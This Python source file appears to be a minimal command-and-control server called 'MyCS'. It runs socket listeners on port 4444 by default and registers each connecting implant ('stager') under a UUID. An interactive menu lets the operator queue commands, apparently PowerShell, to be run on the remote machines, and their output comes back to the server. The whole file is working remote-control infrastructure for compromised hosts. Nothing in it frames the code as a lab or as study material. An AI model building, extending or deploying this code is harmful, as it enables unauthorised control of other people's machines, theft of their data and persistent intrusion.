import socket
import struct
import threading
import queue
import uuid 

class myconstant():
    def __init__(self):
        self.SETHOSTNAME = 1
        self.SETPORT = 2
        self.GETINFO = 3
        self.STARTLISTENER = 4
        self.GETSTAGER = 5
        self.INTOSTAGER = 6
        self.GETLISTENER = 7
        self.STOPLISTENER = 8
        self.EXIT = 9

class myconstant_networking():
    def __init__(self):
        self.PSRUN_SUCCESS = "PSRUN_SUCCESS"


class myserver():

    def __init__(self):
        self.__mysocket_list = dict()
        self.__mydata_list = dict()
        self.__myaddr_list = dict()
        self.__myuuid_list = list()

        self.__mylistener_start_list = dict() #bool
        self.__mylistener_hostname_list = dict()
        self.__mylistener_port_list = dict()
        self.__mylistener_socket_list = dict()
        self.__mylistener_uuid_list = list()

        self.__hostname = "127.0.0.1"
        self.__port = 4444
        self.__test = "This is the test"

    def start_worker(self,myuuid):
        t_net_constant = myconstant_networking()
        print("[Stager] This is the worker for myuuid: {}".format(myuuid))
        while True:
            # This will be the main runner
            item_que = self.__mydata_list[myuuid]
            mysocket = self.__mysocket_list[myuuid]
            try:
                cmd_struct_to_send = item_que.get(block=True, timeout=5)
            except queue.Empty:
                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                continue
            
            try:
                encode_tag = cmd_struct_to_send[0].encode("ascii", "ignore")
                send_result = mysocket.send(encode_tag)
                print("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_tag), send_result))
                recv_result = mysocket.recv(1024)
                decode_result = recv_result.decode("ascii", "ignore")
                print("[Stager] Send command_tag result: {}".format(decode_result))

                encode_cmd = cmd_struct_to_send[1].encode("ascii", "ignore")
                send_result = mysocket.send(encode_cmd)
                print("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_cmd), send_result))
                recv_result = mysocket.recv(1024)
                decode_result = recv_result.decode("ascii", "ignore")
                print("[Stager] Send command result: {}".format(decode_result))

                # try get cmd result if any
                recv_result = mysocket.recv(1024)
                decode_result = recv_result.decode("ascii", "ignore")
                print("[Stager] Run Command result: {}".format(decode_result))
                # ack for success
                encode_cmd = t_net_constant.PSRUN_SUCCESS.encode("ascii", "ignore")
                send_result = mysocket.send(encode_cmd)
                print("[DEBUG] PSRUN_SUCCESS sent")

            except Exception as e:
                print("Exception: ",e)
                mysocket.shutdown(socket.SHUT_RDWR)
                mysocket.close()
                #remove from worker list
                self.__mydata_list.pop(myuuid, None)
                self.__mysocket_list.pop(myuuid, None)
                self.__myaddr_list.pop(myuuid, None)
                self.__myuuid_list.remove(myuuid)
                print("[Stager] {} is stoped ...".format(myuuid))
                break


    def start_listener(self):
        print("Starting listener on Hostname: {} and Port: {}".format(self.__hostname,self.__port))
        #get uuid
        listeneruuid = uuid.uuid4().hex[:6].upper()
        self.__mylistener_start_list[listeneruuid] = True
        self.__mylistener_hostname_list[listeneruuid] = self.__hostname
        self.__mylistener_port_list[listeneruuid] = self.__port
        self.__mylistener_uuid_list.append(listeneruuid)

        self.__mylistener_socket_list[listeneruuid] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.__mylistener_socket_list[listeneruuid].bind((self.__hostname, self.__port))
        self.__mylistener_socket_list[listeneruuid].settimeout(5)
        self.__mylistener_socket_list[listeneruuid].listen()
        
        while self.__mylistener_start_list[listeneruuid]:
            try:
                #print("[DEBUG] Waiting for new connection ...")
                conn, addr = self.__mylistener_socket_list[listeneruuid].accept()
                print("[Listener] Connected by", addr)
                #get uuid
                myuuid = uuid.uuid4().hex[:6].upper()
                #push socket into dict
                self.__mysocket_list[myuuid] = conn
                #push addr into dict
                self.__myaddr_list[myuuid] = addr
                #create fifo
                self.__mydata_list[myuuid] = queue.Queue()
                #push uuid
                self.__myuuid_list.append(myuuid)
                print("[Listener] myuuid is {}".format(myuuid))
                threading.Thread(target=self.start_worker,args=(myuuid,)).start()
                
            except socket.timeout:
                pass
        
        # our of while loop
        self.__mylistener_socket_list[listeneruuid].close()
        self.__mylistener_start_list.pop(listeneruuid, None)
        self.__mylistener_hostname_list.pop(listeneruuid, None)
        self.__mylistener_port_list.pop(listeneruuid, None)
        self.__mylistener_socket_list.pop(listeneruuid, None)
        self.__mylistener_uuid_list.remove(listeneruuid)
        print("[Listener] {} is stoped ...".format(listeneruuid))


    def create_command(self,stager,tag,command):
        self.__mydata_list[stager].put([tag,command])
    
    def stop_listener(self,listener):
        self.__mylistener_start_list[listener] = False

    def print_info(self):
        print("======Listener Info=========")
        print("Listener Type: socket")
        print("Hostname: {}".format(self.__hostname))
        print("Port Number: {}".format(self.__port))
    
    def print_stager(self):
        print("List of avaliable stager: {}".format(self.__myuuid_list))
    
    def print_listener(self):
        print("List of avaliable listener: {}".format(self.__mylistener_uuid_list))

    def get_stager(self):
        return self.__myuuid_list
    def get_listener(self):
        return self.__mylistener_uuid_list

    def set_hostname(self,hostname):
        assert(type(hostname) is str)
        self.__hostname = hostname

    def set_portnumber(self,port):
        assert(type(port) is int)
        self.__port = port


def cmd_list():
    print("1. Set listener hostname")
    print("2. Set listener portnumber")
    print("3. Get Info")
    print("4. Start listener")
    print("5. Get Stager")
    print("6. Interact with Stager")
    print("7. Get listener")
    print("8. Stop listener")
    print("9. Exit")


def main():
    
    print("Hello To MyCS ...")
    cmd_list()
    
    #init
    t_myconstant = myconstant()
    t_myserver = myserver()

    to_exit = False
    while (not to_exit):
        user_input = input("Please enter your selection: ")
        try: 
            command_id = int(user_input)
        except ValueError:
            cmd_list()
            continue
        
        if command_id == t_myconstant.EXIT:
            print("Thanks for using MyCS..")
            exit()
        if command_id == t_myconstant.GETINFO:
            t_myserver.print_info()
            continue
        if command_id == t_myconstant.SETHOSTNAME:
            user_input = input("Please enter the hostname to listen on: ")
            t_myserver.set_hostname(user_input)
            continue
        if command_id == t_myconstant.SETPORT:
            user_input = input("Please enter the port number to listen on: ")
            t_myserver.set_portnumber(int(user_input))
            continue
        if command_id == t_myconstant.STARTLISTENER:
            threading.Thread(target=t_myserver.start_listener).start()
            continue
        if command_id == t_myconstant.GETSTAGER:
            t_myserver.print_stager()
            continue
        if command_id == t_myconstant.INTOSTAGER:
            user_input_stager = input("Please enter the stager uuid: ")
            if user_input_stager not in t_myserver.get_stager():
                print("Please input a valid stager uuid")
                continue
            user_input_command_tag = input("Please enter the command tag: ")
            user_input_command = input("Please enter the command: ")
            t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
            continue
        if command_id == t_myconstant.GETLISTENER:
            t_myserver.print_listener()
        if command_id == t_myconstant.STOPLISTENER:
            user_input_listener = input("Please enter the listener uuid: ")
            if user_input_listener not in t_myserver.get_listener():
                print("Please input a valid listener uuid")
                continue
            t_myserver.stop_listener(user_input_listener)
            

if __name__ == "__main__":
    main()













